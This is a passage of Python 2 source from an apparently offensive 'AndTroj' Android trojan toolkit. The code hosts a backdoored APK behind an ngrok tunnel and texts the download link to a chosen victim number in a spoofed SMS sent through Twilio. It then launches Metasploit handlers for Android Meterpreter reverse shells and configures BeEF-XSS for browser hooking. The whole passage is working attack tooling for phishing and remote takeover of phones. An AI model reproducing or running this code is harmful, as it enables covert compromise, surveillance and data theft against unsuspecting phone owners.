            subprocess.call(
                'gnome-terminal --tab -e \'ngrok http 80\''
                , shell=True)
            subprocess.call(
                'service apache2 start && cp ' + MAM + '-b.apk /var/www/html/'
                , shell=True)
            print "\nI: Please 10 sec waiting...\n"
            time.sleep(10.0)
            checkng = os.path.exists('/usr/share/AndTroj/tmp/link_rat.txt')
            if checkng == (False):
                subprocess.call(
                    'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ"/' + MAM + '-b.apk > /usr/share/AndTroj/tmp/link_rat.txt'
                    , shell=True)
                subprocess.call(
                    'sed -i -e \'s/\/root\///g\' /usr/share/AndTroj/tmp/link_rat.txt'
                    , shell=True)
            else:
                subprocess.call(
                    'rm /usr/share/AndTroj/tmp/link_rat.txt'
                    , shell=True)
                subprocess.call(
                    'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ"/' + MAM + '-b.apk > /usr/share/AndTroj/tmp/link_rat.txt'
                    , shell=True)
                subprocess.call(
                    'sed -i -e \'s/\/root\///g\' /usr/share/AndTroj/tmp/link_rat.txt'
                    , shell=True)

            dir_sok = "/usr/share/twilio/twilio_sid.txt"
            dir_tok = "/usr/share/twilio/twilio_token.txt"
            link_rat = "/usr/share/AndTroj/tmp/link_rat.txt"
            ssid = open(dir_sok, "r")
            rssid = ssid.read()
            tokid = open(dir_tok, "r")
            rtokid = tokid.read()
            link_r = open(link_rat, "r")
            link_at = link_r.read()
            account_sid = '{0}'.format(rssid)
            auth_token = '{0}'.format(rtokid)
            client = Client(account_sid, auth_token)
            message = client.messages.create(
                from_='' + IP_CLONE + '',
                body='' + Message + '\n' + link_at + '',
                to='' + TargetNum + ''
            )

            print(message.sid)
            f = open(metdod, "r")
            cont = f.read()
            if cont == "reverse_tcp":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + SLAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                    , shell=True)
            elif cont == "reverse_http":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + SLAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                    , shell=True)
            elif cont == "reverse_https":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + SLAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                    , shell=True)
            else:
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + SLAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                    , shell=True)
            print "\nI: Start Ngrok status..."
            print "I: Start Apache2 status..."
            print "I: Start Msfconsole listing..."
            print "I: Send SMS Spoof for {0}...".format(TargetNum)
            print "I: Content SMS Spoof: {0}...".format(Message)
            print "\n\t[*] Join my channel > https://t.me/Unk9vvN"
            print_engeener()
            socialEng()
        else:
            print "\n\t[X] Please selected 4 item for install Ngrok BeEF and Twilio..."
            print_engeener()
            socialEng()

    elif main_eng == "3":
        checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
        if checkauth == (False):
            IP_CLONE = raw_input("\n\n\t[?] URL CLONE: ")
            print "\n"
        else:
            print "\n\t[X] Please selected 4 item for install Ngrok BeEF and Twilio..."
            print_engeener()
            socialEng()

    elif main_eng == "4":
        cls()
        VLAN = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                              if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                              s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                              socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
        checkz = os.path.exists('/root/.ngrok2/ngrok.yml')
        print "\n"
        if checkz == (False):
            NGTOK = raw_input("\n\t[i] Visit & Copy Token > https://dashboard.ngrok.com/auth"
                              "\n\t[?] Ngrok Token: ")
            Twtl = raw_input("\n\t[i] Visit & Copy Token > https://www.twilio.com/console/project/settings"
                             "\n\t[?] Twilio Token: ")
            SID_twtl = raw_input("\n\t[i] Visit & Copy Token > https://www.twilio.com/console/"
                                 "\n\t[?] Twilio SID: ")
            print "\n"
            check = os.path.exists('/usr/share/twilio')
            if check == (False):
                subprocess.call(
                    'mkdir /usr/share/twilio && chmod +x /usr/share/twilio && echo "' + Twtl + '" > /usr/share/twilio/twilio_token.txt && echo "' + SID_twtl + '" > /usr/share/twilio/twilio_sid.txt'
                    , shell=True)
            else:
                print "I: Twilio Token installed..."
                pass
            check_geo = os.path.exists('/opt/GeoIP/GeoLiteCity.dat')
            if check_geo == (False):
                subprocess.call(
                    'curl -O http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz'
                    , shell=True)
                subprocess.call(
                    'gunzip GeoLiteCity.dat.gz && mkdir /opt/GeoIP && mv GeoLiteCity.dat /opt/GeoIP'
                    , shell=True)
            else:
                print "I: GeoLiteCity extensions installed..."
                pass
            subprocess.call(
                'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml'
                , shell=True)
            subprocess.call(
                'sed -i \'45s/.*/        dns_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'103s/.*/        db_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml'
                , shell=True)
            subprocess.call(
                'sed -i \'18s/.*/            host: "' + VLAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
                'sed -i \'28s/.*/            callback_host: "' + VLAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml'
                , shell=True)
            execut = '#!/bin/bash\n/usr/share/ngrok/ngrok "$@"'
            commandl = open('/usr/bin/ngrok', 'w')
            commandl.write(execut)
            commandl.close()
            ch_ngrok = os.path.exists('/usr/share/ngrok')
            if ch_ngrok == (False):
                subprocess.call(
                    'mkdir /usr/share/ngrok && chmod +x /usr/share/ngrok && chmod +x /usr/bin/ngrok && '
                    'cd /usr/share/ngrok && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip && '
                    'unzip ngrok-stable-linux-amd64.zip && rm ngrok-stable-linux-amd64.zip && ./ngrok authtoken ' + NGTOK + ''
                    , shell=True)
            else:
                print "I: Ngrok tunnel dns installed..."
                pass
            print "I: Set {0} for metaploit config.yaml...".format(VLAN)
            print "I: Set {0} for BeEF config.yaml...".format(IP)
            print "\n\t[i] Twilio is Ready..."
            print "\t[i] Ngrok is Ready..."
            print "\t[i] BeEF is Ready..."
            print_engeener()
            socialEng()
        else:
            print "\n\t[i] Twilio is Ready..."
            print "\t[i] Ngrok is Ready..."
            print "\t[i] BeEF is Ready..."
            print_engeener()
            socialEng()
    elif main_eng == "0":
        sys.exit()
    else:
        print_engeener()
        socialEng()

socialEng()
